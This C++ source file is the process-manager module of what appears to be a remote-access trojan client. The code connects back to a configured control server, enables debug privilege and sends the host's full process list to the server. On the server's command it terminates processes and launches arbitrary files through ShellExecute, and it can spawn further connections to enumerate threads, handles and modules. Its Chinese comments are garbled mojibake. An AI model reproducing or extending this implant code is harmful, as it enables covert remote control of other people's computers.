#include "ProcessManager.h"

extern
char  __ServerAddress[MAX_PATH];
extern
unsigned short __ConnectPort;

HANDLE __EnumThreaderProcessID = NULL;
HANDLE __EnumHandleProcessID   = NULL;
HANDLE __EnumModuleProcessID = NULL;
CProcessManager::CProcessManager(_CIOCPClient * IOCPClient) :CManager(IOCPClient)
{
	memset(m_ThreadHandle, NULL, sizeof(HANDLE) * 0x1000);
	m_ThreadHandleCount = 0;
	m_IsWow64Process = NULL;
	printf("���̹����캯������\r\n");
	EnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);
	HMODULE Kernel32ModuleBase = NULL;
	Kernel32ModuleBase = GetModuleHandleA("kernel32.dll");
	if (Kernel32ModuleBase == NULL)
	{
		MessageBox(0, "Kernel32ModuleBase == NULL", 0, 0);
	}

	m_IsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(Kernel32ModuleBase, "IsWow64Process");

	if (m_IsWow64Process == NULL)
	{
		MessageBox(0,"IsWow64Process == NULL",0,0);
	}
	SendClientProcessList();
}

CProcessManager::~CProcessManager()
{
	printf("~���̹���������������\r\n");
	EnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_DEBUG_NAME);
}

VOID CProcessManager::HandleIO(PBYTE BufferData, ULONG BufferLength)
{
	BYTE IsToken;

	switch (BufferData[0])
	{
	case CLIENT_PROCESS_MANAGER_REFRESH:
	{
		SendClientProcessList();
		break;
	}
	case CLIENT_PROCESS_MANAGER_KILL_ONE:
	{
		KillProcess((LPBYTE)BufferData + 1, BufferLength - 1);
		break;
	}

	case CLIENT_PROCESS_MANAGER_ENUM_THREADER:
	{
		//Խ��BufferData[0];
		memcpy(&__EnumThreaderProcessID, BufferData + 1,4);
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)ProcessThreadManagerProcedure,
			NULL, 0, NULL);
		break;
	}
	case CLIENT_PROCESS_MANAGER_ENUM_HANDLE:
	{
		//Խ��BufferData[0];
		memcpy(&__EnumHandleProcessID, BufferData + 1, 4);
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)ProcessHandleManagerProcedure,
			NULL, 0, NULL);
		break;
	}
	case CLIENT_PROCESS_MANAGER_ENUM_MODULE:
	{
		//Խ��BufferData[0];
		memcpy(&__EnumModuleProcessID, BufferData + 1, 4);
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)ProcessModuleManagerProcedure,
			NULL, 0, NULL);
		break;
	}
	case CLIENT_REMOTE_OPEN_PROCESS:
	{
		int Token = CLIENT_REMOTE_OPEN_PROCESS_REPLY;
		BOOL IsOk = OpenSpecifyProcess(BufferData + 1, BufferLength);	//��ָ������
																	//�ش����
		char* Data = new char[5];
		memset(Data, 0, 5);
		memcpy(Data, &Token, sizeof(BYTE));
		memcpy(Data + 1, &IsOk, sizeof(BOOL));
		m_IOCPClient->OnSending(Data, sizeof(BOOL) + sizeof(BYTE));
		if (Data != NULL)
		{
			delete[] Data;
			Data = NULL;
		}
		break;
	}

	}
}

//ö�ٽ�����Ϣ
BOOL CProcessManager::SendClientProcessList()
{
	//ÿ����ö���ٷ���
	BOOL IsOk = FALSE;
	BOOL Offset = 1;
	DWORD v1 = 0;
	ULONG ItemCount = 0;
	char* BufferData = NULL;

	vector<_PROCESS_ITEM_INFORMATION_>ProcessItemInfoVector;
	vector<_PROCESS_ITEM_INFORMATION_>::iterator i;
	if (m_IsWow64Process == NULL)
	{
		return IsOk;
	}
	//������ö���µĽ�����Ϣ
	if (SeEnumProcessByToolHelp32(ProcessItemInfoVector) == FALSE)
	{
		return IsOk;
	}
	BufferData = (char*)LocalAlloc(LPTR, 0x50);
	if (BufferData==NULL)
	{
		goto Exit;
	}
	//��װ���ݰ�
	BufferData[0] = CLIENT_PROCESS_MANAGER_REPLY;
	for (i = ProcessItemInfoVector.begin(); i != ProcessItemInfoVector.end(); i++)
	{
		v1 = sizeof(HANDLE) + lstrlen(i->ProcessImageName) + lstrlen(i->ProcessFullPath)+strlen(i->IsWow64Process) + 3;
		//������̫С�������·�����
		if (LocalSize(BufferData)<(Offset+v1))
		{
			BufferData = (char*)LocalReAlloc(BufferData, (Offset + v1),
				LMEM_ZEROINIT | GMEM_MOVEABLE);
		}

		memcpy(BufferData + Offset, &(i->ProcessID), sizeof(HANDLE));
		Offset += sizeof(HANDLE);

		memcpy(BufferData + Offset, i->ProcessImageName, lstrlen(i->ProcessImageName) + 1);
		Offset += lstrlen(i->ProcessImageName) + 1;

		memcpy(BufferData + Offset, i->ProcessFullPath, lstrlen(i->ProcessFullPath) + 1);
		Offset += lstrlen(i->ProcessFullPath) + 1;

		memcpy(BufferData + Offset, i->IsWow64Process, lstrlen(i->IsWow64Process) + 1);
		Offset += lstrlen(i->IsWow64Process) + 1;
		
	}
	//�������ݰ���Server��
	m_IOCPClient->OnSending((char*)BufferData, LocalSize(BufferData));
	IsOk = TRUE;
Exit:
	if (BufferData!=NULL)
	{
		LocalFree(BufferData);
		BufferData = NULL;
	}
	return IsOk;
}

BOOL CProcessManager::SeEnumProcessByToolHelp32(vector<PROCESS_ITEM_INFORMATION>& ProcessItemInfoVector)
{
	HANDLE   SnapshotHandle = NULL;
	HANDLE   ProcessHandle = NULL;
	char     IsWow64Process[20] = { 0 };
	PROCESSENTRY32  ProcessEntry32;
	PROCESS_ITEM_INFORMATION    ProcessItemInfo = { 0 };
	char  ProcessFullPath[MAX_PATH] = { 0 };

	ProcessEntry32.dwSize = sizeof(PROCESSENTRY32);

	SnapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (SnapshotHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	//�õ���һ������˳���ж�һ��ϵͳ�����Ƿ�ɹ�
	if (Process32First(SnapshotHandle, &ProcessEntry32))
	{
		do
		{
			//�򿪽��̲����ؾ��
			ProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
				FALSE, ProcessEntry32.th32ProcessID);   //��Ŀ�����  
														//	
			if (ProcessHandle == NULL)// Ȩ��̫�� - ���ʹ�
			{
				ProcessHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
					FALSE, ProcessEntry32.th32ProcessID);   //��Ŀ�����

				if (ProcessHandle == NULL)
				{
					strcpy(ProcessFullPath, "�򿪽���ʧ��");
					strcpy(IsWow64Process, "�޷��ж�");
					goto Label;

				}

			}
			//�ж�Ŀ����̵�λ��
			BOOL v1 = FALSE;
			if (SeIsWow64Process(ProcessHandle, &v1) == TRUE)
			{
				if (v1)
				{
					strcpy(IsWow64Process, "32λ");
				}
				else
				{
					strcpy(IsWow64Process, "64λ");
				}
			}
			else
			{
				strcpy(IsWow64Process, "�޷��ж�");
			}

			//ͨ�����̾����õ�һ��ģ������Ϣ
			HMODULE ModuleHandle = NULL;

			DWORD ReturnLength = GetModuleFileNameExA(ProcessHandle, ModuleHandle,
				ProcessFullPath,
				sizeof(ProcessFullPath));

			if (ReturnLength == 0)
			{
				//���ʧ��
				RtlZeroMemory(ProcessFullPath, MAX_PATH);

				QueryFullProcessImageName(ProcessHandle, 0, ProcessFullPath, &ReturnLength);	// ���Ƽ�ʹ���������
				if (ReturnLength == 0)
				{
					strcpy(ProcessFullPath, "ö����Ϣʧ��");
				}
			}
		Label:
			ZeroMemory(&ProcessItemInfo, sizeof(ProcessItemInfo));

			ProcessItemInfo.ProcessID = (HANDLE)ProcessEntry32.th32ProcessID;
			memcpy(ProcessItemInfo.ProcessImageName, ProcessEntry32.szExeFile, strlen(ProcessEntry32.szExeFile) + 1);
			memcpy(ProcessItemInfo.ProcessFullPath, ProcessFullPath, strlen(ProcessFullPath) + 1);
			memcpy(ProcessItemInfo.IsWow64Process, IsWow64Process, strlen(IsWow64Process) + 1);
			ProcessItemInfoVector.push_back(ProcessItemInfo);

			if (ProcessHandle != NULL)
			{
				CloseHandle(ProcessHandle);
				ProcessHandle = NULL;
			}

		} while (Process32Next(SnapshotHandle, &ProcessEntry32));
	}
	else
	{
		CloseHandle(SnapshotHandle);

		return FALSE;
	}

	CloseHandle(SnapshotHandle);

	return ProcessItemInfoVector.size()>0 ? TRUE : FALSE;
}

BOOL CProcessManager::SeIsWow64Process(HANDLE ProcessHandle,BOOL* IsResult)
{
	if (!SeIsValidWritePoint(IsResult))
	{
		return FALSE;
	}

	if (m_IsWow64Process != NULL)
	{
		if (!m_IsWow64Process(ProcessHandle, IsResult))
		{
			return FALSE;
		}
	}

	return TRUE;
}

BOOL  CProcessManager::SeIsValidWritePoint(LPVOID VirtualAddress)
{
#define PAGE_WRITE_FLAGS \
    (PAGE_READWRITE | PAGE_WRITECOPY | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY)
	BOOL IsOk = FALSE;
	MEMORY_BASIC_INFORMATION MemoryBasicInfo = { 0 };
	VirtualQuery(VirtualAddress, &MemoryBasicInfo, sizeof(MEMORY_BASIC_INFORMATION));

	if ((MemoryBasicInfo.State == MEM_COMMIT && (MemoryBasicInfo.Protect & PAGE_WRITE_FLAGS)))
	{
		IsOk = TRUE;
	}
	return IsOk;
}

//ɱ������
VOID CProcessManager::KillProcess(LPBYTE BufferData, UINT BufferLength)
{
	HANDLE ProcessHandle = NULL;
	EnableSeDebugPrivilege(GetCurrentProcess(),TRUE,SE_DEBUG_NAME); //��Ȩ

	for (int i = 0; i < BufferLength; i += 4)//��Ϊ�����Ŀ��ܸ���ֹ��һ������
	{
		//�򿪽���
		ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(BufferData + i));
		//��������
		if (ProcessHandle == NULL)
		{
			continue;
		}
		TerminateProcess(ProcessHandle, 0);
		CloseHandle(ProcessHandle);
	}
	EnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);  //��ԭ��Ȩ
	Sleep(5);														   // ����Sleep�£���ֹ����

	BYTE bToken = CLIENT_PROCESS_MANAGER_KILL_ONE_REPLY;   //�򱻿ض˷���һ��COMMAND_SYSTEM
	m_IOCPClient->OnSending((char*)&bToken, sizeof(BYTE));
}

//�����߳�ģʽ
DWORD WINAPI ProcessThreadManagerProcedure(LPVOID ParemeterData)
{
	HANDLE ProcessID = __EnumThreaderProcessID;
	_CIOCPClient CIOCPClient;
	if (!CIOCPClient.ConnectServer(__ServerAddress, __ConnectPort))
	{
		return -1;
	}
	CProcessThreadManager ProcessThreadManager(&CIOCPClient);
	if (ProcessThreadManager.SeEnumThreadInfoByProcessID(ProcessID))
	{
		ProcessThreadManager.SendClientProcessThreaderList();
	}
	CIOCPClient.WaitingForEvent();
	return 0;
}

DWORD WINAPI ProcessHandleManagerProcedure(LPVOID ParemeterData)
{
	HANDLE ProcessID = __EnumHandleProcessID;
	_CIOCPClient CIOCPClient;
	if (!CIOCPClient.ConnectServer(__ServerAddress, __ConnectPort))
	{
		return -1;
	}
	CProcessHandleManager ProcessHandleManager(&CIOCPClient);
	if (ProcessHandleManager.EnumHandleInfoByProcessID(ProcessID))
	{
		ProcessHandleManager.SendClientProcessHandleList();
	}
	CIOCPClient.WaitingForEvent();
	return 0;
}

DWORD WINAPI ProcessModuleManagerProcedure(LPVOID ParemeterData)
{
	HANDLE ProcessID = __EnumModuleProcessID;
	_CIOCPClient CIOCPClient;
	if (!CIOCPClient.ConnectServer(__ServerAddress, __ConnectPort))
	{
		return -1;
	}

	CProcessModuleManager ProcessModuleManager(&CIOCPClient);
	if (ProcessModuleManager.EnumModuleInfoByProcessID(ProcessID))
	{
		ProcessModuleManager.SendClientProcessModuleList();
	}
	CIOCPClient.WaitingForEvent();
	return 0;
}

BOOL CProcessManager::OpenSpecifyProcess(PBYTE BufferData, ULONG_PTR BufferLength)
{
	HINSTANCE InstanceHandle = ShellExecute(GetDesktopWindow(), "open", (LPCSTR)BufferData, "", "", SW_SHOWNORMAL);
	if ((DWORD)InstanceHandle > 32)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}